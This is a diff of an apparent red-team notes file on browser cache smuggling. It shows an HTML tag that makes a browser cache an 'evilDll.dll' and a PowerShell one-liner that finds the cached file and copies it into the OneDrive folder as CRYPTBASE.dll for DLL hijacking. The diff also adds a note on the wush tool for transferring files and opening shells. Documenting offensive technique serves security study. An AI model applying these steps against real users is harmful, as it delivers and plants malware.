@@ -180,7 +180,7 @@ Our goal is to force the download of either a DLL or an executable. To do so, we
 <img src=evilDll.dll>
 ```
 
-[^browser-cache-smug]: [Browser Cache Smuggling](../../Readwise/Articles/Aurélien%20Chalot%20-%20Browser%20Cache%20Smuggling.md)
+[^browser-cache-smug]: [Aurélien Chalot - Browser Cache Smuggling](../../Readwise/Articles/Aurélien%20Chalot%20-%20Browser%20Cache%20Smuggling.md)
 
 Because cached files are saved without extension and with a random name, we need to inject some custom metadata in order to find them easily. We can do it using custom Tags on our web server configuration:
 
@@ -204,6 +204,14 @@ We can find those tags using powershell:
 ```powershell
 foreach ($f in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")){Get-ChildItem $f -Recurse|%{if(Select-String -Pattern "DLLHERE" -Path $_.FullName){copy $_.FullName $env:LOCALAPPDATA\Microsoft\OneDrive\CRYPTBASE.dll}}}
 ```
+
+## File transfer using WireGuard
+
+`wush` [^wush] is a command line tool that lets you easily transfer files and open shells over a peer-to-peer WireGuard connection. It works both on Linux and Windows. Download the binaries or the source code from [github](https://github.com/coder/wush/releases).
+
+[^wush]: [Erik - Last Week in Security (LWiS) - 2024-09-03](../../Readwise/Articles/Erik%20-%20Last%20Week%20in%20Security%20(LWiS)%20-%202024-09-03.md#^edb065)
+
+
 
 ---
 
